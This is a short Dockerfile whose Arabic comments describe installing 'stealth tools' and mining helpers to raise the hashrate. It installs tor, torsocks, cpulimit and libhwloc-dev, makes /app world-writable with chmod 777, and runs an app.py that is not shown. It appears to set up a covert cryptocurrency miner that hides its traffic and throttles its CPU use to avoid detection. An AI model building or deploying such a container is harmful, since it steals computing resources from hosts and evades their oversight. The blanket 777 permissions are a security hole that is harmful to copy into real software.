FROM python:3.10-slim

# تثبيت أدوات التخفي وأدوات التعدين المساعدة لزيادة الـ Hashrate
RUN apt-get update && apt-get install -y \
    curl \
    wget \
    tar \
    cpulimit \
    tor \
    torsocks \
    libhwloc-dev \
    && rm -rf /var/lib/apt/lists/*

WORKDIR /app
COPY . .

# إعطاء الصلاحيات المطلقة
RUN chmod -R 777 /app

CMD ["python3", "app.py"]